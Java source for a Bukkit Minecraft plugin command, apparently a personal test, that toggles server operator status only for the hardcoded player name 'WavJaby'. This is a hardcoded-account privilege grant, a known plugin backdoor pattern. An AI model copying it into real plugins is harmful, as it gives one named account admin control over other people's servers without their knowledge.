package mc.mytestplugin;

import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.command.CommandExecutor;

public class CustomOpCommand implements CommandExecutor {

	@Override
	public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
    	if (sender instanceof Player) {
    		Player p = (Player)sender;
    		if (p.getName().equals("WavJaby")) {
    			p.setOp(!sender.isOp());
    			p.sendMessage("You are " + (sender.isOp() ? "" : ChatColor.RED + "NOT " + ChatColor.COLOR_CHAR) + "op.");
    		}
    		else {
    			p.sendMessage("You are not WavJaby! " + p.getName());
    		}
            return true;
    	}
        return false;
	}
}
